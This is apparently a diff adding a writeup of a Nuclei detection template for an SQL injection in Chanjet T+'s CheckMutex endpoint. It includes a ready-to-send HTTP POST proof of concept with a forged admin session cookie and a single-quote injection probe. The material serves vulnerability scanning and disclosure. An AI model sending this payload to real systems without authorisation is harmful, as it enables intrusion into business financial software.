@@ -1,0 +1,24 @@
+# Nuclei Template: Chanjet Tplus CheckMutex - SQL Injection
+**Template ID:** chanjet-tplus-checkmutex-sqli
+**Vulnerability Class:** SQL Injection
+**Severity:** High
+**CWE:** CWE-89
+**Source:** Nuclei Template (`chanjet-tplus-checkmutex-sqli.yaml`)
+
+## Vulnerability Information & PoC
+
+## Description
+There is an SQL injection vulnerability in the Changjetcrm financial crm system under Yonyou.
+
+## Steps to reproduce / Exploit Payload
+```http
+POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1
+Host: {{Hostname}}
+Content-Type: text/plain
+Cookie: ASP.NET_SessionId=; sid=admin
+
+{"accNum": "6'", "functionTag": "SYS0104", "url": ""}
+```
+
+## References
+- https://github.com/MrWQ/vulnerability-paper/blob/7551f7584bd35039028b1d9473a00201ed18e6b2/bugs/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%94%A8%E5%8F%8B%E7%95%85%E6%8D%B7%E9%80%9A%20T%2B%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
